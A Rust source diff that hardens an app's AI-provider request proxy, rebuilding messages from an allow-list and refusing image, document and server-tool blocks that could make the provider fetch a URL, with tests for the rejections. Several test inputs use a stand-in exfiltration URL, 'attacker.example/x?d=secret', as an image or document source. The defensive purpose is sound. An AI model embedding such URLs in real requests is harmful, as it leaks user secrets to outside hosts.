@@ -252,20 +252,118 @@ fn request_object(body: &Value) -> Result<&Map<String, Value>, String> {
     body.as_object().ok_or_else(|| "The assistant request must be a JSON object.".to_string())
 }
 
+/// Anthropic content blocks the assistant may send: text, its own tool calls and their results.
+/// Anything else (`image`, `document`, search results, ...) can make the provider fetch a URL
+/// or file, so it is refused, and each kept block is rebuilt from the fields its type needs.
+fn sanitize_text_block(block: &Value) -> Result<Value, String> {
+    let text = block
+        .get("text")
+        .filter(|text| text.is_string())
+        .filter(|_| block.get("type").and_then(Value::as_str) == Some("text"))
+        .ok_or_else(|| ONLY_OWN_TOOLS.to_string())?;
+    Ok(serde_json::json!({ "type": "text", "text": text }))
+}
+
+fn sanitize_text_blocks(blocks: &Value) -> Result<Value, String> {
+    let blocks = blocks.as_array().ok_or_else(|| ONLY_OWN_TOOLS.to_string())?;
+    Ok(Value::Array(blocks.iter().map(sanitize_text_block).collect::<Result<Vec<_>, _>>()?))
+}
+
+fn string_field(block: &Value, field: &str) -> Result<Value, String> {
+    block.get(field).filter(|value| value.is_string()).cloned().ok_or_else(|| ONLY_OWN_TOOLS.to_string())
+}
+
+fn sanitize_content_block(block: &Value) -> Result<Value, String> {
+    match block.get("type").and_then(Value::as_str) {
+        Some("text") => sanitize_text_block(block),
+        Some("tool_use") => {
+            let input = block
+                .get("input")
+                .filter(|input| input.is_object())
+                .ok_or_else(|| ONLY_OWN_TOOLS.to_string())?;
+            Ok(serde_json::json!({
+                "type": "tool_use", "id": string_field(block, "id")?,
+                "name": string_field(block, "name")?, "input": input
+            }))
+        }
+        Some("tool_result") => {
+            let mut clean = Map::new();
+            clean.insert("type".to_string(), Value::from("tool_result"));
+            clean.insert("tool_use_id".to_string(), string_field(block, "tool_use_id")?);
+            match block.get("content") {
+                None => {}
+                Some(content) if content.is_string() => {
+                    clean.insert("content".to_string(), content.clone());
+                }
+                Some(content) => {
+                    clean.insert("content".to_string(), sanitize_text_blocks(content)?);
+                }
+            }
+            match block.get("is_error") {
+                None => {}
+                Some(flag) if flag.is_boolean() => {
+                    clean.insert("is_error".to_string(), flag.clone());
+                }
+                Some(_) => return Err(ONLY_OWN_TOOLS.to_string()),
+            }
+            Ok(Value::Object(clean))
+        }
+        _ => Err(ONLY_OWN_TOOLS.to_string()),
+    }
+}
+
+fn sanitize_message(message: &Value) -> Result<Value, String> {
+    let object = message
+        .as_object()
+        .ok_or_else(|| "Each assistant message must be a JSON object.".to_string())?;
+    let role = object
+        .get("role")
+        .and_then(Value::as_str)
+        .filter(|role| ["user", "assistant"].contains(role))
+        .ok_or_else(|| "The assistant message has an unsupported role.".to_string())?;
+    let content = match object.get("content") {
+        Some(content) if content.is_string() => content.clone(),
+        Some(Value::Array(blocks)) => {
+            Value::Array(blocks.iter().map(sanitize_content_block).collect::<Result<Vec<_>, _>>()?)
+        }
+        _ => return Err(ONLY_OWN_TOOLS.to_string()),
+    };
+    Ok(serde_json::json!({ "role": role, "content": content }))
+}
+
 /// Rebuilds the Anthropic request from an allow-list, so this command (the webview's only
 /// route to the network) cannot be used as a general proxy for the user's key: no streaming,
-/// no server-side tools such as web search (they carry a `type`), and a bounded `max_tokens`.
+/// no server-side tools such as web search (they carry a `type`), no image, document or other
+/// block that makes the provider fetch something, and a bounded `max_tokens`.
 fn sanitize_request(body: Value) -> Result<Value, String> {
     let object = request_object(&body)?;
     let mut clean = Map::new();
-    for key in ["model", "system", "messages", "tools", "tool_choice"] {
+    for key in ["model", "tools", "tool_choice"] {
         if let Some(value) = object.get(key) {
             clean.insert(key.to_string(), value.clone());
         }
     }
+    match object.get("system") {
+        None => {}
+        Some(system) if system.is_string() => {
+            clean.insert("system".to_string(), system.clone());
+        }
+        Some(system) => {
+            clean.insert("system".to_string(), sanitize_text_blocks(system)?);
+        }
+    }
+    if let Some(messages) = object.get("messages") {
+        let messages = messages
+            .as_array()
+            .ok_or_else(|| "The assistant request needs a message list.".to_string())?
+            .iter()
+            .map(sanitize_message)
+            .collect::<Result<Vec<_>, _>>()?;
+        clean.insert("messages".to_string(), Value::Array(messages));
+    }
     if let Some(tools) = clean.get("tools").and_then(Value::as_array) {
         if tools.iter().any(|tool| tool.get("type").is_some() || tool.get("name").is_none()) {
-            return Err("The assistant may only use the reader's own tools.".to_string());
+            return Err(ONLY_OWN_TOOLS.to_string());
         }
     }
     clean.insert("max_tokens".to_string(), capped_max_tokens(object));
@@ -274,8 +372,22 @@ fn sanitize_request(body: Value) -> Result<Value, String> {
 
 const ONLY_OWN_TOOLS: &str = "The assistant may only use the reader's own tools.";
 const CHAT_ROLES: [&str; 4] = ["system", "user", "assistant", "tool"];
-const CHAT_MESSAGE_FIELDS: [&str; 4] = ["content", "tool_calls", "tool_call_id", "name"];
 
+/// An assistant `tool_calls` entry is exactly `{id, type: "function", function: {name, arguments}}`.
+fn sanitize_chat_tool_call(call: &Value) -> Result<Value, String> {
+    let exactly = |value: &Value, fields: &[&str]| {
+        value.as_object().is_some_and(|object| object.len() == fields.len() && fields.iter().all(|field| object.contains_key(*field)))
+    };
+    let function = call.get("function").filter(|function| exactly(function, &["name", "arguments"]));
+    let valid = exactly(call, &["id", "type", "function"])
+        && call.get("type").and_then(Value::as_str) == Some("function")
+        && call.get("id").is_some_and(Value::is_string)
+        && function.is_some_and(|function| function["name"].is_string() && function["arguments"].is_string());
+    if valid { Ok(call.clone()) } else { Err(ONLY_OWN_TOOLS.to_string()) }
+}
+
+/// Content is a string (or null for an assistant turn that only calls tools); content parts
+/// such as `image_url` and `file` are refused.
 fn sanitize_chat_message(message: &Value) -> Result<Value, String> {
     let object = message
         .as_object()
@@ -285,12 +397,27 @@ fn sanitize_chat_message(message: &Value) -> Result<Value, String> {
         .and_then(Value::as_str)
         .filter(|role| CHAT_ROLES.contains(role))
         .ok_or_else(|| "The assistant message has an unsupported role.".to_string())?;
+    let content = object.get("content").unwrap_or(&Value::Null);
     let mut clean = Map::new();
     clean.insert("role".to_string(), Value::from(role));
-    for field in CHAT_MESSAGE_FIELDS {
-        if let Some(value) = object.get(field) {
-            clean.insert(field.to_string(), value.clone());
+    match (role, content) {
+        (_, Value::String(_)) => {}
+        ("assistant", Value::Null) => {}
+        _ => return Err(ONLY_OWN_TOOLS.to_string()),
+    }
+    clean.insert("content".to_string(), content.clone());
+    match role {
+        "assistant" => {
+            if let Some(calls) = object.get("tool_calls") {
+                let calls = calls.as_array().ok_or_else(|| ONLY_OWN_TOOLS.to_string())?;
+                let calls = calls.iter().map(sanitize_chat_tool_call).collect::<Result<Vec<_>, _>>()?;
+                clean.insert("tool_calls".to_string(), Value::Array(calls));
+            }
         }
+        "tool" => {
+            clean.insert("tool_call_id".to_string(), string_field(message, "tool_call_id")?);
+        }
+        _ => {}
     }
     Ok(Value::Object(clean))
 }
@@ -720,7 +847,7 @@ mod tests {
                 {"role": "user", "content": "hi"},
                 {"role": "assistant", "content": null, "tool_calls": [{"id": "c1", "type": "function",
                     "function": {"name": "go_to", "arguments": "{}"}}]},
-                {"role": "tool", "tool_call_id": "c1", "name": "go_to", "content": "ok"}
+                {"role": "tool", "tool_call_id": "c1", "content": "ok"}
             ])
         );
         assert_eq!(
@@ -728,6 +855,144 @@ mod tests {
             json!([{"type": "function", "function": {
                 "name": "go_to", "description": "d", "parameters": {"type": "object"}}}])
         );
+    }
+
+    fn anthropic_with_messages(messages: Value) -> Value {
+        json!({"model": "m", "system": "s", "messages": messages})
+    }
+
+    #[test]
+    fn anthropic_refuses_blocks_that_make_the_provider_fetch_something() {
+        let url = json!({"type": "url", "url": "https://attacker.example/x?d=secret"});
+        let refused = [
+            json!([{"role": "user", "content": [{"type": "image", "source": url}]}]),
+            json!([{"role": "user", "content": [{"type": "document", "source": url}]}]),
+            json!([{"role": "user", "content": [{"type": "text", "text": "hi"}, {"type": "image", "source": url}]}]),
+            json!([{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t",
+                "content": [{"type": "image", "source": url}]}]}]),
+            json!([{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t",
+                "content": [{"type": "document", "source": url}]}]}]),
+            json!([{"role": "user", "content": [{"type": "search_result", "title": "t", "content": []}]}]),
+            json!([{"role": "user", "content": [{"type": "server_tool_use", "id": "s", "name": "web_search", "input": {}}]}]),
+            json!([{"role": "user", "content": [{"text": "no type"}]}]),
+            json!([{"role": "user", "content": [{"type": "text", "text": 5}]}]),
+            json!([{"role": "assistant", "content": [{"type": "tool_use", "id": "t", "name": "n", "input": "not an object"}]}]),
+            json!([{"role": "user", "content": [{"type": "tool_result", "tool_use_id": 3, "content": "x"}]}]),
+            json!([{"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t", "content": 7}]}]),
+            json!([{"role": "user", "content": {"type": "image", "source": url}}]),
+            json!([{"role": "user"}]),
+            json!([{"role": "system", "content": "x"}]),
+            json!("not a list"),
+        ];
+        for messages in refused {
+            let refusal = sanitize_request(anthropic_with_messages(messages.clone()));
+            assert!(refusal.is_err(), "{messages}");
+            assert!(sanitize(A, anthropic_with_messages(messages)).is_err());
+        }
+        let mut system = anthropic_with_messages(json!([]));
+        system["system"] = json!([{"type": "image", "source": url}]);
+        assert!(sanitize_request(system).is_err());
+        let mut system = anthropic_with_messages(json!([]));
+        system["system"] = json!({"type": "text", "text": "not an array"});
+        assert!(sanitize_request(system).is_err());
+    }
+
+    #[test]
+    fn anthropic_keeps_only_the_fields_each_block_needs() {
+        let mut body = anthropic_with_messages(json!([
+            {"role": "user", "content": "hi", "cache_control": {"type": "ephemeral"}},
+            {"role": "assistant", "content": [
+                {"type": "text", "text": "ok", "cache_control": {"type": "ephemeral"}, "citations": null},
+                {"type": "tool_use", "id": "t1", "name": "go_to", "input": {"target": "7"}, "caller": "x"}
+            ]},
+            {"role": "user", "content": [
+                {"type": "tool_result", "tool_use_id": "t1", "content": [{"type": "text", "text": "done", "citations": []}],
+                    "is_error": true, "cache_control": {"type": "ephemeral"}}
+            ]}
+        ]));
+        body["system"] = json!([{"type": "text", "text": "s", "cache_control": {"type": "ephemeral"}}]);
+        let cleaned = sanitize_request(body).unwrap();
+        assert_eq!(cleaned["system"], json!([{"type": "text", "text": "s"}]));
+        assert_eq!(
+            cleaned["messages"],
+            json!([
+                {"role": "user", "content": "hi"},
+                {"role": "assistant", "content": [
+                    {"type": "text", "text": "ok"},
+                    {"type": "tool_use", "id": "t1", "name": "go_to", "input": {"target": "7"}}
+                ]},
+                {"role": "user", "content": [
+                    {"type": "tool_result", "tool_use_id": "t1", "content": [{"type": "text", "text": "done"}], "is_error": true}
+                ]}
+            ])
+        );
+    }
+
+    #[test]
+    fn chat_refuses_content_parts_and_tool_calls_with_extra_fields() {
+        let url = json!({"url": "https://attacker.example/x?d=secret"});
+        let call = |extra: Value| {
+            let mut call = json!({"id": "c1", "type": "function", "function": {"name": "go_to", "arguments": "{}"}});
+            if let Some(extra) = extra.as_object() {
+                for (key, value) in extra {
+                    call[key] = value.clone();
+                }
+            }
+            call
+        };
+        let mut wrong_function = call(json!({}));
+        wrong_function["function"]["extra"] = json!(1);
+        let mut object_arguments = call(json!({}));
+        object_arguments["function"]["arguments"] = json!({"a": 1});
+        let mut wrong_type = call(json!({}));
+        wrong_type["type"] = json!("custom");
+        let refused = [
+            json!({"role": "user", "content": [{"type": "image_url", "image_url": url}]}),
+            json!({"role": "user", "content": [{"type": "text", "text": "hi"}]}),
+            json!({"role": "user", "content": [{"type": "file", "file": {"file_id": "f"}}]}),
+            json!({"role": "system", "content": [{"type": "text", "text": "hi"}]}),
+            json!({"role": "user", "content": null}),
+            json!({"role": "user"}),
+            json!({"role": "tool", "tool_call_id": "c1", "content": [{"type": "image_url", "image_url": url}]}),
+            json!({"role": "tool", "content": "no id"}),
+            json!({"role": "tool", "tool_call_id": 4, "content": "x"}),
+            json!({"role": "assistant", "content": [{"type": "file", "file": {"file_id": "f"}}]}),
+            json!({"role": "assistant", "content": null, "tool_calls": [call(json!({"extra": 1}))]}),
+            json!({"role": "assistant", "content": null, "tool_calls": [call(json!({"image_url": url}))]}),
+            json!({"role": "assistant", "content": null, "tool_calls": [wrong_function]}),
+            json!({"role": "assistant", "content": null, "tool_calls": [object_arguments]}),
+            json!({"role": "assistant", "content": null, "tool_calls": [wrong_type]}),
+            json!({"role": "assistant", "content": null, "tool_calls": "x"}),
+            json!({"role": "assistant", "content": null, "tool_calls": [{"id": "c1", "type": "function"}]}),
+        ];
+        for message in refused {
+            for provider in [R, O] {
+                let mut body = chat_body();
+                body["messages"] = json!([message.clone()]);
+                assert!(sanitize_chat_request(provider, body).is_err(), "{message}");
+            }
+        }
+    }
+
+    /// Requests recorded from `converse` and `toChatCompletions` (see tests/assistant-requests.test.ts,
+    /// which fails when the app's requests drift from this file).
+    #[test]
+    fn requests_sent_today_are_accepted_unchanged() {
+        let recorded: Value = serde_json::from_str(include_str!("../../tests/fixtures/assistant-requests.json")).unwrap();
+        let anthropic = recorded["anthropic"].as_array().unwrap();
+        let chat = recorded["chat"].as_array().unwrap();
+        assert!(anthropic.len() >= 4 && chat.len() == anthropic.len());
+        for body in anthropic {
+            assert_eq!(&sanitize(A, body.clone()).unwrap(), body);
+        }
+        for body in chat {
+            assert_eq!(&sanitize(R, body.clone()).unwrap(), body);
+            let openai = sanitize(O, body.clone()).unwrap();
+            let mut expected = body.clone();
+            let limit = expected.as_object_mut().unwrap().remove("max_tokens").unwrap();
+            expected["max_completion_tokens"] = limit;
+            assert_eq!(openai, expected);
+        }
     }
 
     #[test]
